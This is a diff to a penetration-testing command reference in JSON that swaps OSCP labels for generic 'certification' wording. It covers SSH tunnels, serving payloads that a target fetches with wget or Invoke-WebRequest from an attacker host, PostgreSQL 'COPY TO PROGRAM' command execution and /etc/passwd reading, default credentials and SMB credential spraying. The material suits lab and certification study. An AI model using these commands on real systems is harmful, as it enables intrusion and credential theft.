@@ -12,7 +12,6 @@
         "SSH",
         "SERVER",
         "SYSTEMD",
-        "OSCP:HIGH",
         "PIVOTING"
       ],
       "variables": [],
@@ -44,8 +43,7 @@
         "Failed to bind port 22: Permission denied": "Requires sudo - port <1024 needs root privileges",
         "Service failed to start": "Check logs: sudo journalctl -u ssh -xe, look for config errors in /etc/ssh/sshd_config"
       },
-      "notes": "Critical OSCP technique:\nStart SSH server on attack machine to receive reverse SSH tunnels from compromised Windows/Linux hosts.\n\nPlink (Windows) and ssh (Linux) can connect back to this server to establish port forwarding.\n\nDefault Kali:\nSSH server pre-installed but not started.\n\nAlways verify PasswordAuthentication yes in sshd_config if using passwords (keys preferred for OPSEC).\n\nUse systemctl enable ssh to start at boot (optional).\n\nTime estimate:\n30 seconds.\n\nProduction:\nUse key authentication only, disable password auth.",
-      "oscp_relevance": "high",
+      "notes": "Critical certification technique:\nStart SSH server on attack machine to receive reverse SSH tunnels from compromised Windows/Linux hosts.\n\nPlink (Windows) and ssh (Linux) can connect back to this server to establish port forwarding.\n\nDefault Kali:\nSSH server pre-installed but not started.\n\nAlways verify PasswordAuthentication yes in sshd_config if using passwords (keys preferred for OPSEC).\n\nUse systemctl enable ssh to start at boot (optional).\n\nTime estimate:\n30 seconds.\n\nProduction:\nUse key authentication only, disable password auth.",
       "methodology_guidance": {
         "after_success": "Verify SSH server listening: ss -ntplu | grep :22 Check SSH server status: sudo systemctl status ssh Test local connection: ssh localhost Configure password authentication if needed: sudo nano /etc/ssh/sshd_config \u2192 PasswordAuthentication yes Reload config after changes: sudo systemctl reload ssh Set up port forwarding from compromised host: plink-remote-forward or ssh-remote-dynamic-port-forward"
       }
@@ -61,7 +59,6 @@
         "APACHE",
         "HTTP_SERVER",
         "FILE_TRANSFER",
-        "OSCP:HIGH",
         "SYSTEMD"
       ],
       "variables": [],
@@ -95,8 +92,7 @@
         "403 Forbidden when accessing file": "Fix permissions: sudo chmod 644 /var/www/html/file, ensure directory traversal allowed in Apache config",
         "Target cannot reach server": "Verify LHOST routing: ip addr show tun0, test with: curl http://<LHOST> from another machine"
       },
-      "notes": "Essential OSCP file transfer technique:\nServe exploits, payloads, enumeration scripts to compromised hosts.\n\nDefault web root:\n/var/www/html/.\n\nCommon pattern:\ncp LinEnum.sh /var/www/html/ \u2192 wget http://<LHOST>/LinEnum.sh on target.\n\nAdvantages over Python HTTP server:\nService management, logging, performance.\n\nDisadvantage:\nRequires root for port 80.\n\nAlternative:\npython3 -m http.server 8000 runs unprivileged on port 8000.\n\nAlways monitor /var/log/apache2/access.log to confirm target downloaded file.\n\nTime estimate:\n30 seconds.\n\nProduction:\nUse TLS, authentication, non-standard ports.",
-      "oscp_relevance": "high",
+      "notes": "Essential certification file transfer technique:\nServe exploits, payloads, enumeration scripts to compromised hosts.\n\nDefault web root:\n/var/www/html/.\n\nCommon pattern:\ncp LinEnum.sh /var/www/html/ \u2192 wget http://<LHOST>/LinEnum.sh on target.\n\nAdvantages over Python HTTP server:\nService management, logging, performance.\n\nDisadvantage:\nRequires root for port 80.\n\nAlternative:\npython3 -m http.server 8000 runs unprivileged on port 8000.\n\nAlways monitor /var/log/apache2/access.log to confirm target downloaded file.\n\nTime estimate:\n30 seconds.\n\nProduction:\nUse TLS, authentication, non-standard ports.",
       "methodology_guidance": {
         "after_success": "Verify web server: curl http://localhost Place files in web root: cp exploit.sh /var/www/html/ Serve custom directory: sudo ln -s /path/to/tools /var/www/html/tools Download from target: wget http://<LHOST>/exploit.sh or Invoke-WebRequest http://<LHOST>/nc.exe -OutFile nc.exe Monitor access logs: sudo tail -f /var/log/apache2/access.log",
         "time_estimate": "Alternative: python3 -m http.server 8000 for quick non-root server"
@@ -113,7 +109,6 @@
         "ENUMERATION",
         "NETWORKING",
         "PORT_SCAN",
-        "OSCP:HIGH",
         "SS"
       ],
       "variables": [],
@@ -145,8 +140,7 @@
         "Expected port not listed": "Service not running - check with: sudo systemctl status <service>, start if needed",
         "Port shows LISTEN but connection fails": "Firewall blocking - check: sudo ufw status or sudo iptables -L -n"
       },
-      "notes": "Critical OSCP verification command:\nConfirm SSH/Apache/port forwards are listening before attempting connections.\n\nModern replacement for netstat (faster, part of iproute2).\n\nCommon workflow:\nStart service \u2192 ss -ntplu | grep :<PORT> \u2192 Verify process name matches.\n\nPort forward debugging:\nCheck for 127.0.0.1:<REMOTE_PORT> entry to confirm tunnel established.\n\nProcess column shows which service owns each port - essential for troubleshooting port conflicts.\n\nOutput format:\nState Recv-Q Send-Q Local_Address:Port Peer_Address:Port Process.\n\nTime estimate:\n5 seconds.\n\nAlias tip:\nalias ports='ss -ntplu' for quick access.",
-      "oscp_relevance": "high",
+      "notes": "Critical certification verification command:\nConfirm SSH/Apache/port forwards are listening before attempting connections.\n\nModern replacement for netstat (faster, part of iproute2).\n\nCommon workflow:\nStart service \u2192 ss -ntplu | grep :<PORT> \u2192 Verify process name matches.\n\nPort forward debugging:\nCheck for 127.0.0.1:<REMOTE_PORT> entry to confirm tunnel established.\n\nProcess column shows which service owns each port - essential for troubleshooting port conflicts.\n\nOutput format:\nState Recv-Q Send-Q Local_Address:Port Peer_Address:Port Process.\n\nTime estimate:\n5 seconds.\n\nAlias tip:\nalias ports='ss -ntplu' for quick access.",
       "methodology_guidance": {
         "after_success": "Verify expected services: grep ':22\\|:80\\|:443' to find SSH/HTTP/HTTPS Identify port forwards: grep '127.0.0.1' to find local tunnels Check for conflicts: If starting service fails, use ss -ntplu | grep :<PORT> to find occupying process Kill conflicting process: sudo kill <PID> or sudo systemctl stop <service> Monitor for new connections: watch -n 1 'ss -ntplu' for real-time updates"
       }
@@ -162,7 +156,6 @@
         "ENUMERATION",
         "NETWORKING",
         "IP_ADDRESS",
-        "OSCP:HIGH",
         "IPROUTE2"
       ],
       "variables": [],
@@ -173,7 +166,7 @@
       "success_indicators": [
         "Output shows interface names (eth0, tun0, wlan0)",
         "Each interface lists IP addresses: inet <IP>/CIDR",
-        "VPN interface visible: tun0 or tap0 with OSCP lab IP (10.x.x.x)",
+        "VPN interface visible: tun0 or tap0 with pentest lab IP (10.x.x.x)",
         "Local interface: lo with 127.0.0.1/8",
         "Ethernet/WiFi: eth0/wlan0 with LAN IP (192.168.x.x)"
       ],
@@ -194,8 +187,7 @@
         "Interface DOWN": "Bring up interface: sudo ip link set <interface> up",
         "No IP assigned": "Request DHCP: sudo dhclient <interface> or assign static: sudo ip addr add <IP>/24 dev <interface>"
       },
-      "notes": "Essential OSCP command:\nDetermine LHOST value for reverse shells and SSH tunnels.\n\nModern replacement for ifconfig.\n\nCommon pattern:\nVPN connects \u2192 ip addr show tun0 \u2192 Note IP \u2192 Use in exploit payloads.\n\nInterface states:\nUP/DOWN in output.\n\nIP format:\ninet <IP>/<CIDR> brd <broadcast>.\n\nIPv6 addresses shown as inet6.\n\nShorthand:\nip a (same as ip addr).\n\nOutput includes:\nLink layer (MAC), IP layer (addresses), interface state (UP/DOWN/UNKNOWN).\n\nTime estimate:\n5 seconds.\n\nOSCP critical:\nAlways verify tun0 IP before starting engagement.",
-      "oscp_relevance": "high",
+      "notes": "Essential certification command:\nDetermine LHOST value for reverse shells and SSH tunnels.\n\nModern replacement for ifconfig.\n\nCommon pattern:\nVPN connects \u2192 ip addr show tun0 \u2192 Note IP \u2192 Use in exploit payloads.\n\nInterface states:\nUP/DOWN in output.\n\nIP format:\ninet <IP>/<CIDR> brd <broadcast>.\n\nIPv6 addresses shown as inet6.\n\nShorthand:\nip a (same as ip addr).\n\nOutput includes:\nLink layer (MAC), IP layer (addresses), interface state (UP/DOWN/UNKNOWN).\n\nTime estimate:\n5 seconds.\n\ncertification critical:\nAlways verify tun0 IP before starting engagement.",
       "methodology_guidance": {
         "after_success": "Identify LHOST for reverse shells: Look for tun0 IP \u2192 Use in bash-reverse-shell, nc-reverse-shell Extract IP programmatically: ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 Set LHOST in config: crack reference --set LHOST <IP> Verify routing: ip route to see which interface is default gateway Check connectivity: ping <TARGET> -I tun0 to test VPN routing"
       }
@@ -211,7 +203,6 @@
         "ENUMERATION",
         "NETWORKING",
         "ROUTING",
-        "OSCP:MEDIUM",
         "IPROUTE2"
       ],
       "variables": [],
@@ -224,7 +215,7 @@
         "Default route: default via <gateway_ip> dev <interface>",
         "VPN routes: 10.x.x.x/24 dev tun0 proto kernel scope link",
         "Local network: 192.168.x.0/24 dev eth0 proto kernel scope link",
-        "Lab subnets: Multiple 10.x.x.0/24 entries for OSCP network segments"
+        "Lab subnets: Multiple 10.x.x.0/24 entries for security work network segments"
       ],
       "failure_indicators": [
         "ip: command not found - iproute2 not installed",
@@ -242,10 +233,8 @@
         "Duplicate routes": "Delete old route: sudo ip route del <destination> via <old_gateway>, then add correct route",
         "Cannot reach target network": "Check routing table, add static route if needed, verify firewall rules"
       },
-      "notes": "Important OSCP enumeration:\nUnderstanding routing helps identify network topology and multi-homed pivot points.\n\nModern replacement for route -n.\n\nOutput format:\n<destination> via <gateway> dev <interface> [proto <protocol>] [metric <priority>].\n\nScope link means directly connected network (no gateway).\n\nProto kernel means automatically added by kernel.\n\nPivoting use case:\nOn compromised host, ip route reveals other network segments accessible from that host - indicates potential pivot paths.\n\nTime estimate:\n5 seconds.\n\nProduction:\nStatic routes persist with /etc/network/interfaces or NetworkManager.",
-      "oscp_relevance": "medium",
+      "notes": "Important certification enumeration:\nUnderstanding routing helps identify network topology and multi-homed pivot points.\n\nModern replacement for route -n.\n\nOutput format:\n<destination> via <gateway> dev <interface> [proto <protocol>] [metric <priority>].\n\nScope link means directly connected network (no gateway).\n\nProto kernel means automatically added by kernel.\n\nPivoting use case:\nOn compromised host, ip route reveals other network segments accessible from that host - indicates potential pivot paths.\n\nTime estimate:\n5 seconds.\n\nProduction:\nStatic routes persist with /etc/network/interfaces or NetworkManager.",
       "methodology_guidance": {
-        "oscp_tips": "Verify VPN routing: Check for tun0 entries with OSCP lab subnets (10.x.x.0/24)",
         "after_success": "Identify default gateway: Look for 'default via' entry - determines internet routing Check route conflicts: Multiple routes to same network may cause issues Test connectivity: ping <TARGET> and traceroute <TARGET> to verify routing Add static route if needed: sudo ip route add <subnet>/24 via <gateway> dev <interface> Pivoting: Identify multi-homed hosts by checking routing table on compromised machine"
       }
     },
@@ -260,7 +249,6 @@
         "NMAP",
         "PORT_SCAN",
         "ENUMERATION",
-        "OSCP:HIGH",
         "VERIFICATION"
       ],
       "variables": [
@@ -306,8 +294,7 @@
         "Nmap scan very slow": "Add -T4 for faster timing (less stealthy): sudo nmap -p <PORT> -Pn -v -T4 <TARGET>",
         "Permission denied without sudo": "Raw socket operations require root - always use sudo for accurate results"
       },
-      "notes": "Critical OSCP verification technique:\nConfirm services started before attempting connections.\n\nUse cases:\n1) Verify SSH server listening after systemctl start ssh, 2) Confirm port forward active after Plink/SSH tunnel, 3) Check HTTP server before wget from target, 4) Validate RDP access before xfreerdp.\n\nAlways use -Pn flag to skip ping (OSCP hosts often block ICMP).\n\nVerbose (-v) provides progress feedback during scan.\n\nFast alternative for localhost:\nnc -zv localhost <PORT>.\n\nTime estimate:\n2-5 seconds per port.\n\nProduction:\nUse -sV for version detection, --script for vulnerability scanning.",
-      "oscp_relevance": "high",
+      "notes": "Critical certification verification technique:\nConfirm services started before attempting connections.\n\nUse cases:\n1) Verify SSH server listening after systemctl start ssh, 2) Confirm port forward active after Plink/SSH tunnel, 3) Check HTTP server before wget from target, 4) Validate RDP access before xfreerdp.\n\nAlways use -Pn flag to skip ping (certification hosts often block ICMP).\n\nVerbose (-v) provides progress feedback during scan.\n\nFast alternative for localhost:\nnc -zv localhost <PORT>.\n\nTime estimate:\n2-5 seconds per port.\n\nProduction:\nUse -sV for version detection, --script for vulnerability scanning.",
       "methodology_guidance": {
         "after_success": "If open: Proceed with service connection (ssh, xfreerdp, psql, smbclient) If closed: Verify service running on target (ss -ntplu), start service if needed If checking port forward: Scan 127.0.0.1:<PORT> on SSH server to verify tunnel Version detection: Add -sV flag for detailed service version: sudo nmap -p <PORT> -Pn -v -sV <TARGET> Service enumeration: Use service-specific Nmap scripts: sudo nmap -p <PORT> -Pn -v --script=<script_name> <TARGET>",
         "on_failure": "If filtered: Check firewall rules on target, verify network routing, try alternative port"
@@ -325,8 +312,7 @@
         "POSTGRESQL",
         "DATABASE",
         "ENUMERATION",
-        "PIVOTING",
-        "OSCP:HIGH"
+        "PIVOTING"
       ],
       "variables": [
         {
@@ -388,8 +374,7 @@
         "SSL connection error": "Disable SSL: psql -h <TARGET> -U <USER> -d <DB> sslmode=disable",
         "No route to host": "Set up port forward if database is internal: ssh -L 5432:<TARGET>:5432 pivot_user@pivot_host, then psql -h 127.0.0.1"
       },
-      "notes": "Critical OSCP database enumeration technique:\nExtract credentials, application data, and potentially execute commands with superuser privileges.\n\nCommon pivoting pattern:\nPort scan reveals 5432 internal \u2192 SSH local port forward \u2192 psql to 127.0.0.1 \u2192 Dump credentials.\n\nPostgreSQL superuser capabilities:\nCOPY TO PROGRAM for command execution (9.3+), COPY FROM for file reading, CREATE EXTENSION for loading malicious libraries.\n\nMetafile commands:\n\\l (databases), \\dt (tables), \\du (users), \\d <table> (describe), \\c <db> (switch database), \\q (quit).\n\nDefault credentials to try:\npostgres:postgres, postgres:<blank>, admin:admin.\n\nTime estimate:\n1-2 minutes for initial enumeration.\n\nProduction:\nAlways use SSL, restrict pg_hba.conf, disable superuser remote access.",
-      "oscp_relevance": "high",
+      "notes": "Critical certification database enumeration technique:\nExtract credentials, application data, and potentially execute commands with superuser privileges.\n\nCommon pivoting pattern:\nPort scan reveals 5432 internal \u2192 SSH local port forward \u2192 psql to 127.0.0.1 \u2192 Dump credentials.\n\nPostgreSQL superuser capabilities:\nCOPY TO PROGRAM for command execution (9.3+), COPY FROM for file reading, CREATE EXTENSION for loading malicious libraries.\n\nMetafile commands:\n\\l (databases), \\dt (tables), \\du (users), \\d <table> (describe), \\c <db> (switch database), \\q (quit).\n\nDefault credentials to try:\npostgres:postgres, postgres:<blank>, admin:admin.\n\nTime estimate:\n1-2 minutes for initial enumeration.\n\nProduction:\nAlways use SSL, restrict pg_hba.conf, disable superuser remote access.",
       "methodology_guidance": {
         "after_success": "List all databases: \\l or SELECT datname FROM pg_database; Switch database: \\c <database_name> List tables in current database: \\dt or SELECT tablename FROM pg_tables WHERE schemaname='public'; Describe table structure: \\d <table_name> Extract credentials: SELECT username,password FROM users; (look for password hashes) Check user privileges: SELECT * FROM pg_user; or \\du Command execution if superuser: COPY (SELECT '') TO PROGRAM 'id'; (PostgreSQL 9.3+) Read files if superuser: CREATE TABLE pwn(t TEXT); COPY pwn FROM '/etc/passwd'; Exit: \\q or Ctrl+D"
       },
@@ -406,7 +391,6 @@
         "SMB",
         "ENUMERATION",
         "NULL_SESSION",
-        "OSCP:HIGH",
         "SMBCLIENT"
       ],
       "variables": [
@@ -453,8 +437,7 @@
         "Protocol negotiation failed": "SMBv1 disabled - force SMB2: smbclient -N -L //<TARGET> --option='client min protocol=SMB2'",
         "Unable to initialize messaging context": "Non-critical warning - ignore if shares still listed"
       },
-      "notes": "Essential OSCP SMB enumeration technique:\nNull sessions reveal share names without credentials - often exposes sensitive files, backup configs, or writable directories for payload upload.\n\nNull sessions common on:\nWindows 2000/XP/2003, misconfigured Windows 7/2008.\n\nModern Windows (10/2019+) disables null sessions by default.\n\nCommon share names:\nADMIN$ (C:\\Windows), C$ (C:\\), IPC$ (inter-process communication), NETLOGON, SYSVOL (domain controllers), Users, Backups, Public.\n\nWritable share use case:\nUpload malicious file \u2192 Execute via RCE vulnerability.\n\nTime estimate:\n5-10 seconds.\n\nProduction:\nAlways disable null sessions, restrict share permissions, use SMB signing.",
-      "oscp_relevance": "high",
+      "notes": "Essential certification SMB enumeration technique:\nNull sessions reveal share names without credentials - often exposes sensitive files, backup configs, or writable directories for payload upload.\n\nNull sessions common on:\nWindows 2000/XP/2003, misconfigured Windows 7/2008.\n\nModern Windows (10/2019+) disables null sessions by default.\n\nCommon share names:\nADMIN$ (C:\\Windows), C$ (C:\\), IPC$ (inter-process communication), NETLOGON, SYSVOL (domain controllers), Users, Backups, Public.\n\nWritable share use case:\nUpload malicious file \u2192 Execute via RCE vulnerability.\n\nTime estimate:\n5-10 seconds.\n\nProduction:\nAlways disable null sessions, restrict share permissions, use SMB signing.",
       "methodology_guidance": {
         "after_success": "If shares listed: Attempt anonymous access: smbclient -N //<TARGET>/<SHARE_NAME> Enumerate share contents: ls, get <file>, mget * (download all files) Check for writable shares: cd into share, attempt: put test.txt If access denied: Try authenticated access: smbclient -U <USERNAME> //<TARGET>/<SHARE_NAME> Alternative enumeration: enum4linux -a <TARGET> for comprehensive SMB enumeration Credential spraying: crackmapexec smb <TARGET> -u users.txt -p passwords.txt --shares Mount share for easier access: sudo mount -t cifs //<TARGET>/<SHARE> /mnt/smb -o username=,password="
       },
